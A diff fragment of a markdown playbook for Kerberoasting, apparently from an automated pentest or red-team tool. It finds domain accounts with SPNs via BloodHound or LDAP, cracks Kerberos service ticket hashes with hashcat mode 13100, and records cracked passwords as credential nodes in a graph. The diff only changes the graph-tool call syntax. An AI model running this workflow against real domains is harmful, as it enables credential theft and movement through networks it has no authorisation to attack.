@@ -16,7 +16,7 @@ Any valid domain user. No special privileges required.
 ## 1. Identify roastable accounts
 From BloodHound ingest:
 ```
-kg_query(kind="user", filter="hasspn=true and enabled=true")
+bhce_cypher("MATCH (u:User {hasspn:true, enabled:true}) RETURN u.name, u.spns")
 ```
 Or LDAP-direct:
 ```bash
@@ -63,9 +63,12 @@ hashcat -m 13100 -a 6 /tmp/kerb.hashes wordlist.txt '?d?d?d?d' \
 
 ## 4. Promote cracked credential
 ```
-kg_add_node(kind="credential", label="USER:CRACKED_PASSWORD",
-            props={"source":"kerberoast","crack_time":"<n>m","mode":"hashcat-m13100"})
-kg_add_edge(src=<cred>, dst=<user>, kind="authenticates")
+kg_record('[{"kind": "Credential", "key": "credential::<user>",
+  "label": "<USER>:<CRACKED_PASSWORD>",
+  "props": {"source": "kerberoast", "crack_time": "<n>m",
+            "mode": "hashcat-m13100"},
+  "edges_out": [{"to_key": "user::<user>",
+                 "kind": "AUTHENTICATES_TO"}]}]')
 ```
 
 ## 5. Post-crack actions
